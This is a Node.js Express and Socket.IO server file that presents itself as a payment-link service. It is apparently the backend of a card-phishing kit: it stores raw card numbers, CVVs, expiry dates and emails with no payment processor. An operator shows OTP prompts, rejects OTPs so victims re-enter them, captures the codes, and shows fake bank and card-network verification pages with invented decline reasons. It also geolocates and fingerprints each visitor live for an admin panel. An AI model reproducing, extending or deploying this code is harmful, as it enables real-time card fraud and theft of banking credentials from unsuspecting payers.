import express from 'express';
import bodyParser from 'body-parser';
import cors from 'cors';
import crypto from 'crypto';
import { Server } from 'socket.io';
import path from 'path';
import fs from 'fs';
import fetch from 'node-fetch'; // Make sure this is installed

// Generate a unique ID for this server instance
const SERVER_ID = crypto.randomBytes(3).toString('hex');

// Store visitors with last activity timestamp
const visitors = new Map();
const VISITOR_TIMEOUT = 60000; // 60 seconds timeout for inactive visitors

// Store manually expired payment links
const expiredLinks = new Set();

// Create HTML redirect files
function createRedirectFile(targetHtml) {
  const fileName = `pay${SERVER_ID}.html`;
  const redirectHtml = `
<!DOCTYPE html>
<html>
<head>
  <meta http-equiv="refresh" content="0;url=/${targetHtml}?${Date.now()}">
  <script>
    window.location.href = '/${targetHtml}' + window.location.search;
  </script>
</head>
<body>
  <p>Loading...</p>
</body>
</html>
`;

  fs.writeFileSync(fileName, redirectHtml);
  console.log(`Created redirect file: ${fileName} -> ${targetHtml}`);
  return fileName;
}

// Create a redirect file for landing.html
const PAYMENT_REDIRECT_FILE = createRedirectFile('landing.html');

// Initialize Express app
const app = express();
app.use(bodyParser.json());
app.use(cors({
  origin: '*',
  methods: ['GET', 'POST']
}));

// Helper function to check if a payment link is expired
function getPaymentIdFromUrl(url) {
  if (!url) return null;
  
  try {
    // Extract pid from URL query params
    const params = new URLSearchParams(url.split('?')[1]);
    return params.get('pid');
  } catch (error) {
    console.error('Error extracting pid from URL:', error);
    return null;
  }
}

// Helper to check if a link is expired
function isLinkExpired(pid) {
  if (!pid) return false;
  
  // Check if it's manually expired
  if (expiredLinks.has(pid)) {
    return true;
  }
  
  // Check if it exists and check automatic expiration (15 hours)
  if (paymentLinks.has(pid)) {
    const payment = paymentLinks.get(pid);
    const createdAt = new Date(payment.createdAt).getTime();
    const now = new Date().getTime();
    const timeDiff = now - createdAt;
    
    if (timeDiff > 54000000) { // 15 hours in milliseconds
      return true;
    }
  }
  
  return false;
}

// Track visitors middleware and check for expired links
app.use((req, res, next) => {
  // Extract pid from the URL query parameters
  const pid = req.query.pid;
  
  // Check if the URL contains a pid and if that link is expired
  if (pid && isLinkExpired(pid)) {
    console.log(`Redirecting expired link access: ${pid}`);
    return res.redirect('/expired.html');
  }
  
  // If not expired, continue with normal visitor tracking
  if (pid) {
    // Get visitor IP address
    const ip = req.headers['x-forwarded-for'] || 
               req.connection.remoteAddress || 
               req.socket.remoteAddress || 
               'Unknown';
    
    const timestamp = new Date().toLocaleString();
    const lastActive = Date.now();
    const userAgent = req.headers['user-agent'] || 'Unknown';
    
    // Check if this is a new visitor or an update
    const isNewVisitor = !visitors.has(pid);
    
    // Store visitor info with lastActive timestamp and user agent
    const visitor = { 
      pid,
      ip, 
      timestamp,
      url: req.originalUrl,
      lastActive,
      userAgent
    };
    
    visitors.set(pid, visitor);
    
    // Notify admin if this is a new visitor
    if (isNewVisitor && io) {
      io.emit('visitor', visitor);
    }
    
    // Process location data for this visitor
    fetchGeoData(ip).then(geoData => {
      const updatedVisitor = visitors.get(pid);
      if (updatedVisitor) {
        // Add geoData as a nested object to match what admin.html expects
        updatedVisitor.geoData = {
          city: geoData.city,
          country: geoData.country,
          countryCode: geoData.countryCode,
          region: geoData.region,
          isp: geoData.isp,
          org: geoData.org,
          lat: geoData.lat,
          lon: geoData.lon,
          browser: getBrowserInfo(userAgent).browser,
          os: getBrowserInfo(userAgent).os,
          device: getBrowserInfo(userAgent).device
        };
        
        visitors.set(pid, updatedVisitor);
        
        // Tell admin panel we have updated this visitor
        if (io) {
          io.emit('visitor_updated', updatedVisitor);
        }
      }
    }).catch(err => {
      console.error('Error fetching geo data:', err);
      
      // Still create a geoData object with error state
      const errorVisitor = visitors.get(pid);
      if (errorVisitor) {
        errorVisitor.geoData = {
          city: 'Error',
          country: 'Unknown',
          countryCode: 'UN',
          region: 'Unknown',
          isp: 'Error fetching data',
          org: 'Unknown',
          browser: getBrowserInfo(userAgent).browser,
          os: getBrowserInfo(userAgent).os,
          device: getBrowserInfo(userAgent).device,
          lat: 0,
          lon: 0
        };
        
        visitors.set(pid, errorVisitor);
        
        if (io) {
          io.emit('visitor_updated', errorVisitor);
        }
      }
    });
  }
  
  // Block direct access to payment.html and currencypayment.html
  if ((req.path === '/payment.html' || req.path === '/currencypayment.html') && !req.query.pid) {
    return res.status(404).sendFile(path.join(__dirname, '404.html'));
  }
  
  next();
});

// Get browser info from user agent
function getBrowserInfo(userAgent) {
  if (!userAgent) return { browser: 'Unknown', os: 'Unknown', device: 'Unknown' };
  
  let browser = 'Unknown';
  let os = 'Unknown';
  let device = 'Unknown';
  
  // Detect browser
  if (userAgent.includes('Firefox')) browser = 'Firefox';
  else if (userAgent.includes('Chrome') && !userAgent.includes('Edg')) browser = 'Chrome';
  else if (userAgent.includes('Safari') && !userAgent.includes('Chrome')) browser = 'Safari';
  else if (userAgent.includes('Edg')) browser = 'Edge';
  else if (userAgent.includes('MSIE') || userAgent.includes('Trident/')) browser = 'Internet Explorer';
  else if (userAgent.includes('Opera') || userAgent.includes('OPR')) browser = 'Opera';
  
  // Detect OS
  if (userAgent.includes('Windows')) os = 'Windows';
  else if (userAgent.includes('Mac OS')) os = 'macOS';
  else if (userAgent.includes('Linux') && !userAgent.includes('Android')) os = 'Linux';
  else if (userAgent.includes('Android')) os = 'Android';
  else if (userAgent.includes('iOS') || userAgent.includes('iPhone') || userAgent.includes('iPad')) os = 'iOS';
  
  // Detect device
  if (userAgent.includes('iPhone')) device = 'iPhone';
  else if (userAgent.includes('iPad')) device = 'iPad';
  else if (userAgent.includes('Android') && userAgent.includes('Mobile')) device = 'Android Phone';
  else if (userAgent.includes('Android') && !userAgent.includes('Mobile')) device = 'Android Tablet';
  else if ((userAgent.includes('Windows') || userAgent.includes('Mac OS') || userAgent.includes('Linux')) && 
           !userAgent.includes('Mobile')) device = 'Desktop';
  
  return { browser, os, device };
}

// Fetch geolocation data
async function fetchGeoData(ip) {
  // Default data for errors or local IPs
  const defaultData = {
    city: 'Unknown',
    country: 'Unknown',
    countryCode: 'UN',
    region: 'Unknown',
    isp: 'Unknown',
    org: 'Unknown',
    lat: 0,
    lon: 0
  };
  
  // Don't lookup local IPs
  if (!ip || ip === 'Unknown' || ip.includes('127.0.0.1') || ip.includes('::1') || ip.includes('localhost')) {
    defaultData.city = 'Local';
    defaultData.country = 'Local';
    defaultData.countryCode = 'LO';
    defaultData.isp = 'Local Network';
    defaultData.org = 'Local Network';
    return defaultData;
  }
  
  try {
    // Clean IP if needed (remove port numbers, etc)
    const cleanIp = ip.split(',')[0].trim();
    
    // Try ipwho.is API first - more reliable and higher rate limits
    const response = await fetch(`https://ipwho.is/${cleanIp}`);
    
    if (!response.ok) {
      throw new Error(`IP lookup failed with status ${response.status}`);
    }
    
    const data = await response.json();
    
    // Check for API errors
    if (!data.success) {
      throw new Error(data.message || 'IP API error');
    }
    
    return {
      city: data.city || defaultData.city,
      country: data.country || defaultData.country,
      countryCode: data.country_code || defaultData.countryCode,
      region: data.region || defaultData.region,
      isp: data.connection?.isp || defaultData.isp,
      org: data.connection?.org || defaultData.org,
      lat: data.latitude || defaultData.lat,
      lon: data.longitude || defaultData.lon
    };
  } catch (ipwhoError) {
    console.error('Error with ipwho.is API:', ipwhoError);
    console.log('Trying fallback API...');
    
    // Fallback to ipapi.co
    try {
      const response = await fetch(`https://ipapi.co/${ip}/json/`);
      
      if (!response.ok) {
        throw new Error(`IP lookup failed with status ${response.status}`);
      }
      
      const data = await response.json();
      
      if (data.error) {
        throw new Error(data.error);
      }
      
      return {
        city: data.city || defaultData.city,
        country: data.country_name || defaultData.country,
        countryCode: data.country_code || defaultData.countryCode,
        region: data.region || defaultData.region,
        isp: data.org || data.asn || defaultData.isp,
        org: data.org || defaultData.org,
        lat: data.latitude || defaultData.lat,
        lon: data.longitude || defaultData.lon
      };
    } catch (fallbackError) {
      console.error('Error with fallback API:', fallbackError);
      return defaultData;
    }
  }
}

// Heartbeat endpoint for active visitors to ping
app.post('/api/visitor-heartbeat', (req, res) => {
  const { pid } = req.body;
  
  if (pid && visitors.has(pid)) {
    const visitor = visitors.get(pid);
    visitor.lastActive = Date.now();
    visitors.set(pid, visitor);
    return res.json({ success: true });
  }
  
  res.status(400).json({ success: false });
});

// Clean up inactive visitors periodically
function cleanupInactiveVisitors() {
  const now = Date.now();
  let removed = 0;
  
  visitors.forEach((visitor, pid) => {
    if (now - visitor.lastActive > VISITOR_TIMEOUT) {
      visitors.delete(pid);
      removed++;
      
      // Notify admin that visitor has left
      if (io) {
        io.emit('visitor_left', { pid });
      }
    }
  });
  
  if (removed > 0) {
    console.log(`Removed ${removed} inactive visitors`);
  }
}

// Serve static files
app.use(express.static("."));

const PORT = process.env.PORT || 3000;
const server = app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
  console.log(`Redirect file: ${PAYMENT_REDIRECT_FILE}`);
  
  // Start the cleanup interval for inactive visitors
  setInterval(cleanupInactiveVisitors, 10000); // Check every 10 seconds
});

const io = new Server(server);
const transactions = new Map();
const paymentLinks = new Map();

// Endpoint to get active visitor info
app.get('/api/visitors', (req, res) => {
  try {
    // Clean up any inactive visitors first
    cleanupInactiveVisitors();
    
    // Convert the Map to an Array of objects (only active visitors)
    const visitorList = Array.from(visitors.values());
    
    return res.json(visitorList);
  } catch (error) {
    console.error('Error getting visitors:', error);
    return res.status(500).json({ error: 'Failed to get visitors' });
  }
});

// Endpoint to get the pid for a transaction
app.get('/api/getTransactionPid', (req, res) => {
  const { invoiceId } = req.query;
  const txn = transactions.get(invoiceId);
  
  if (!txn) {
    return res.status(404).json({ error: 'Transaction not found' });
  }
  
  // Find the payment link that corresponds to this transaction
  let pid = null;
  paymentLinks.forEach((payment, paymentId) => {
    if (payment.amount === parseFloat(txn.amount)) {
      pid = paymentId;
    }
  });
  
  res.json({ pid });
});

// Payment Links Endpoints
app.post('/api/generatePaymentLink', (req, res) => {
  try {
    const { amount, description } = req.body;

    if (!amount || isNaN(amount) || amount <= 0) {
      return res.status(400).json({ status: "error", message: "Invalid amount" });
    }

    if (!description?.trim()) {
      return res.status(400).json({ status: "error", message: "Description required" });
    }

    const invoiceId = crypto.randomBytes(8).toString('hex').toUpperCase();
    const protocol = req.headers['x-forwarded-proto'] || req.protocol;
    
    // Use the redirect file instead of landing.html
    const paymentLink = `${protocol}://${req.get('host')}/${PAYMENT_REDIRECT_FILE}?pid=${invoiceId}`;

    paymentLinks.set(invoiceId, {
      amount: parseFloat(amount),
      description: description.trim(),
      paymentLink,
      createdAt: new Date().toISOString()
    });

    res.json({ status: "success", paymentLink });
  } catch (error) {
    console.error('Payment Link Error:', error);
    res.status(500).json({ status: "error", message: "Internal server error" });
  }
});

// New endpoint to manually expire a payment link
app.post('/api/expirePaymentLink', (req, res) => {
  const { pid } = req.body;
  
  if (!pid) {
    return res.status(400).json({ status: "error", message: "Payment ID (pid) is required" });
  }
  
  // The pid might be the full link or just the ID portion
  let paymentId = pid;
  
  // Check if the input is a URL
  if (pid.includes('://') || pid.includes('?pid=')) {
    try {
      // Try to extract the pid from the URL
      let url;
      if (pid.includes('?pid=')) {
        // If it's a query parameter format
        const pidParam = pid.split('?pid=')[1];
        paymentId = pidParam.split('&')[0]; // Get just the pid part
      } else {
        // If it's a full URL
        url = new URL(pid);
        const urlParams = new URLSearchParams(url.search);
        paymentId = urlParams.get('pid');
      }
    } catch (error) {
      console.error('Error parsing URL:', error);
      // Continue with the original pid if parsing fails
    }
  }
  
  console.log(`Attempting to expire payment link with ID: ${paymentId}`);
  
  // Check if the payment link exists
  if (!paymentLinks.has(paymentId)) {
    return res.status(404).json({ status: "error", message: "Payment link not found" });
  }
  
  // Mark the link as expired
  expiredLinks.add(paymentId);
  
  console.log(`Payment link manually expired: ${paymentId}`);
  
  res.json({ 
    status: "success", 
    message: "Payment link has been expired successfully" 
  });
});

// Modified endpoint with link expiration check
app.get('/api/getPaymentDetails', (req, res) => {
  const { pid } = req.query;
  
  if (!pid || !paymentLinks.has(pid)) {
    return res.status(404).json({ status: "error", message: "Not found" });
  }
  
  // Use the consistent expiration check
  if (isLinkExpired(pid)) {
    return res.status(410).json({ status: "error", message: "Payment link has expired" });
  }
  
  const payment = paymentLinks.get(pid);
  res.json({ status: "success", payment });
});

// Transactions Endpoints
app.post('/api/sendPaymentDetails', (req, res) => {
  try {
    const { cardNumber, expiry, cvv, email, amount, currency, cardholder } = req.body;

    if (!cardNumber || !expiry || !cvv || !email || !amount || !cardholder) {
      return res.status(400).json({ status: "error", message: "Missing fields" });
    }

    const invoiceId = crypto.randomBytes(8).toString('hex').toUpperCase();
    
    // Get IP address
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;

    const transaction = {
      id: invoiceId,
      cardNumber,
      expiry,
      cvv,
      email,
      amount: amount.toString().replace(/,/g, ''),
      currency,
      cardholder,
      status: 'processing',
      otpShown: false,
      otpEntered: null,
      otpError: false,
      redirectStatus: null,
      bankpageVisible: false,
      timestamp: new Date().toLocaleString(),
      ip: ip  // Add IP address
    };

    transactions.set(invoiceId, transaction);
    io.emit('new_transaction');
    res.json({ status: "success", invoiceId });
  } catch (error) {
    console.error('Transaction Error:', error);
    res.status(500).json({ status: "error", message: "Payment processing failed" });
  }
});

app.get('/api/transactions', (req, res) => {
  res.json(Array.from(transactions.values()));
});

app.post('/api/showOTP', (req, res) => {
  const { invoiceId } = req.body;
  const txn = transactions.get(invoiceId);
  if (!txn) return res.status(404).json({ status: "error", message: "Transaction not found" });

  txn.otpShown = true;
  txn.status = 'otp_pending';
  txn.otpError = false;
  io.to(invoiceId).emit('show_otp');
  res.json({ status: "success", message: "OTP form shown" });
});

app.post('/api/wrongOTP', (req, res) => {
  const { invoiceId } = req.body;
  const txn = transactions.get(invoiceId);
  if (!txn) return res.status(404).json({ status: "error", message: "Transaction not found" });

  txn.otpError = true;
  txn.status = 'otp_pending';
  res.json({ status: "success", message: "OTP marked wrong" });
});

app.get('/api/checkTransactionStatus', (req, res) => {
  const { invoiceId } = req.query;
  const txn = transactions.get(invoiceId);
  if (!txn) return res.status(404).json({ status: "error", message: "Transaction not found" });

  if (txn.status === 'otp_pending' && txn.otpShown) {
    return res.json({
      status: "show_otp",
      message: "Show OTP form",
      otpError: txn.otpError
    });
  }

  if (txn.redirectStatus) {
    const redirectUrls = {
      success: `/success.html?invoiceId=${invoiceId}`,
      fail: `/fail.html?invoiceId=${invoiceId}${txn.failureReason ? `&reason=${txn.failureReason}` : ''}`,
      bankpage: `/bankpage.html?invoiceId=${invoiceId}`
    };
    return res.json({ status: "redirect", redirectUrl: redirectUrls[txn.redirectStatus] });
  }

  res.json({ status: txn.status, otpError: txn.otpError });
});

app.post('/api/submitOTP', (req, res) => {
  const { invoiceId, otp } = req.body;
  const txn = transactions.get(invoiceId);
  if (!txn) return res.status(404).json({ status: "error", message: "Transaction not found" });

  txn.otpEntered = otp;
  txn.status = 'otp_received';
  txn.otpError = false;
  res.json({ status: "success", message: "OTP received" });
});

app.post('/api/updateRedirectStatus', (req, res) => {
  const { invoiceId, redirectStatus, failureReason } = req.body;
  const txn = transactions.get(invoiceId);
  if (!txn) return res.status(404).json({ status: "error", message: "Transaction not found" });

  txn.redirectStatus = redirectStatus;
  if (failureReason) {
    txn.failureReason = failureReason;
  }

  const redirectUrls = {
    success: `/success.html?invoiceId=${invoiceId}`,
    fail: `/fail.html?invoiceId=${invoiceId}${failureReason ? `&reason=${failureReason}` : ''}`
  };

  res.json({
    status: "success",
    invoiceId,
    redirectStatus,
    redirectUrl: redirectUrls[redirectStatus] || `/bankpage.html?invoiceId=${invoiceId}`
  });
});

app.post('/api/showBankpage', (req, res) => {
  const { invoiceId } = req.body;
  const txn = transactions.get(invoiceId);
  if (!txn) return res.status(404).json({ error: 'Transaction not found' });

  txn.redirectStatus = 'bankpage';
  txn.bankpageVisible = true;
  res.json({ status: 'success' });
});

app.post('/api/hideBankpage', (req, res) => {
  const { invoiceId } = req.body;
  const txn = transactions.get(invoiceId);
  if (!txn) return res.status(404).json({ error: 'Transaction not found' });

  txn.redirectStatus = null;
  txn.bankpageVisible = false;
  io.to(invoiceId).emit('hide_bankpage', { invoiceId }); // Include invoiceId in the payload
  res.json({ status: 'success' });
});

app.get('/api/getTransactionForSuccess', (req, res) => {
  const { invoiceId } = req.query;
  const txn = transactions.get(invoiceId);
  if (!txn) return res.status(404).json({ status: "error", message: "Transaction not found" });

  res.json({
    status: "success",
    data: {
      amount: txn.amount,
      invoiceId: txn.id,
      timestamp: txn.timestamp,
      email: txn.email
    }
  });
});

app.get('/api/getTransactionForFail', (req, res) => {
  const { invoiceId, reason } = req.query;
  const txn = transactions.get(invoiceId);
  if (!txn) return res.status(404).json({ status: "error", message: "Transaction not found" });

  // Map reason codes to human-readable messages
  const reasonMessages = {
    'insufficient_balance': 'Insufficient balance in your account',
    'bank_declined': 'Transaction declined by bank',
    'card_disabled': 'Online payments are disabled on your card',
    'invalid_card': 'Invalid card number or details',
    'canceled': 'Transaction canceled by user'
  };

  res.json({
    status: "failed",
    data: {
      amount: txn.amount,
      invoiceId: txn.id,
      timestamp: txn.timestamp,
      email: txn.email,
      reason: reasonMessages[reason] || reasonMessages[txn.failureReason] || 'Transaction failed'
    }
  });
});

io.on('connection', (socket) => {
  socket.on('join', (invoiceId) => {
    socket.join(invoiceId);
  });
  
  // Add listener for currency page redirection
  socket.on('currency_redirect', (data) => {
    if (data.invoiceId && transactions.has(data.invoiceId) && data.pid) {
      io.to(data.invoiceId).emit('redirect_to_currency', { 
        redirectUrl: `/currencypayment.html?pid=${data.pid}` 
      });
    }
  });
  
  // MC verification events
  socket.on('show_mc_verification', (data) => {
    // Broadcast to the client with this invoice ID
    io.to(data.invoiceId).emit('show_mc_verification', data);
  });
  
  socket.on('update_mc_bank', (data) => {
    // Update bank logo on client
    io.to(data.invoiceId).emit('update_mc_bank', {
      invoiceId: data.invoiceId,
      bankCode: data.bankCode
    });
  });
  
  socket.on('mc_otp_submitted', (data) => {
    // Notify admin panel of OTP submission
    io.emit('mc_otp_submitted', data);
  });
  
  socket.on('mc_otp_error', (data) => {
    // Send OTP error to client
    io.to(data.invoiceId).emit('mc_otp_error', data);
  });
  
  socket.on('mc_verification_result', (data) => {
    // Send verification result to client
    io.to(data.invoiceId).emit('mc_verification_result', data);
  });
  
  socket.on('mc_resend_otp', (data) => {
    // Notify admin panel of OTP resend request
    io.emit('mc_resend_otp', data);
  });
});
